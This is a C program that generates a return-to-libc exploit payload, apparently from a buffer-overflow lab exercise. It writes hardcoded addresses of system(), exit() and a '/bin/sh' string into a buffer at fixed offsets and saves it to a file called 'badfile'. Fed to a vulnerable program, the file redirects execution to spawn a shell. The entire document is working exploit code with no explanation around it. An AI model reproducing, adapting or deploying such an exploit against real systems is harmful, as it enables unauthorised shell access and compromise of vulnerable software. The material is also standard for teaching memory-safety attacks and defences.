#include <stdio.h>
#include <string.h>
int main (int argc, char **argv)
{
        char buf[200];
        FILE *badfile;

        memset(buf, 0xaa, 200);

        *(long *) &buf[70] = 0xbffffe8c; // The address of "/bin/sh" -> ebp + 12
        *(long *) &buf[66] = 0xb7e52fb0; // The address of exit() -> ebp + 8
        *(long *) &buf[62] = 0xb7e5f430; // The address of system() -> ebp + 4

        badfile = fopen("./badfile", "w");
        fwrite(buf, sizeof(buf), 1, badfile);
        fclose(badfile);
}
